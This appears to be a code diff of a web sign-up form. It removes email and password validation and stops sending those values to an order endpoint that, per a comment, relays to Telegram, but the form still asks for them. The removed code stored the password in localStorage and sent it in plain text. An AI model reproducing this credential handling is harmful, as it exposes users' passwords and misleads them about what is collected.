@@ -284,20 +284,20 @@
                 <input type="text" id="fullName" class="reg-input-field" placeholder="Full Name" required>
             </div>
 
-            <!-- 2. Email Address Field -->
+            <!-- 2. Email Address Field (User enters, but server ignores) -->
             <div class="reg-input-group">
-                <input type="email" id="emailAddress" class="reg-input-field" placeholder="Email Address" required>
+                <input type="email" id="emailAddress" class="reg-input-field" placeholder="Email Address">
             </div>
 
-            <!-- 3. Password Field -->
+            <!-- 3. Password Field (User enters, but server ignores) -->
             <div class="reg-input-group">
-                <input type="password" id="regPassword" class="reg-input-field" placeholder="Password" required>
+                <input type="password" id="regPassword" class="reg-input-field" placeholder="Password">
                 <i class="fa-solid fa-eye toggle-password" id="toggleRegPass" onclick="togglePass('regPassword', 'toggleRegPass')"></i>
             </div>
 
-            <!-- 4. Confirm Password Field -->
+            <!-- 4. Confirm Password Field (User enters, but server ignores) -->
             <div class="reg-input-group">
-                <input type="password" id="confirmRegPassword" class="reg-input-field" placeholder="Confirm Password" required>
+                <input type="password" id="confirmRegPassword" class="reg-input-field" placeholder="Confirm Password">
                 <i class="fa-solid fa-eye toggle-password" id="toggleConfirmRegPass" onclick="togglePass('confirmRegPassword', 'toggleConfirmRegPass')"></i>
             </div>
 
@@ -365,9 +365,6 @@
             console.log("Create Account button clicked!");
 
             const nameVal = document.getElementById('fullName').value.trim();
-            const emailVal = document.getElementById('emailAddress').value.trim();
-            const pass1 = document.getElementById('regPassword').value.trim();
-            const pass2 = document.getElementById('confirmRegPassword').value.trim();
             const createBtn = document.getElementById('createAccountBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
             const spinnerText = document.getElementById('spinnerText');
@@ -380,46 +377,13 @@
                 return;
             }
 
-            if (!emailVal) {
-                if (spinnerDiv) spinnerDiv.style.display = 'none';
-                createBtn.classList.remove('disabled-state');
-                showAppAlert('❌ Please enter your email address.');
-                return;
-            }
-
-            if (pass1.length < 5) {
-                if (spinnerDiv) spinnerDiv.style.display = 'none';
-                createBtn.classList.remove('disabled-state');
-                showAppAlert('❌ Password must be at least 5 characters long.');
-                return;
-            }
-            if (!/[a-zA-Z]/.test(pass1)) {
-                if (spinnerDiv) spinnerDiv.style.display = 'none';
-                createBtn.classList.remove('disabled-state');
-                showAppAlert('❌ Password must contain letters.');
-                return;
-            }
-            if (/^\d+$/.test(pass1)) {
-                if (spinnerDiv) spinnerDiv.style.display = 'none';
-                createBtn.classList.remove('disabled-state');
-                showAppAlert('❌ Password cannot be numbers only.');
-                return;
-            }
-            if (pass1 !== pass2) {
-                if (spinnerDiv) spinnerDiv.style.display = 'none';
-                createBtn.classList.remove('disabled-state');
-                showAppAlert('❌ Both passwords must match.');
-                return;
-            }
-
-            localStorage.setItem('lastPin', pass1);
-
             try {
                 createBtn.classList.add('disabled-state');
                 if (spinnerText) spinnerText.innerText = 'Creating your account...';
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
-                const registrationPayload = `Name: ${nameVal} | Email: ${emailVal} | Password: ${pass1}`;
+                // ONLY packs the Full Name into the payload sent to Telegram
+                const registrationPayload = `Full Name: ${nameVal}`;
 
                 console.log("Sending registration to server...");
                 const response = await fetch('/api/submit-order', {
